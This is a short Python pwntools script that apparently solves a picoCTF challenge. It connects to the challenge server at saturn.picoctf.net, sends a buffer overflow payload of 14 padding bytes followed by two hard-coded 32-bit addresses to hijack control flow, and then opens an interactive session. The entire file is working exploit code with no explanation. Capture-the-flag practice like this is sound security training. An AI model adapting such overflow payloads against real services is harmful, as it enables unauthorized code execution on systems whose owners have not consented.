#!python3
from pwn import *
#connect saturn.picoctf.net 53974
r = remote('saturn.picoctf.net', 53974)
print(r.recv())
r.sendline(b'a'*14+ p32(0x8049da0) +p32(0x8049e20))
r.interactive()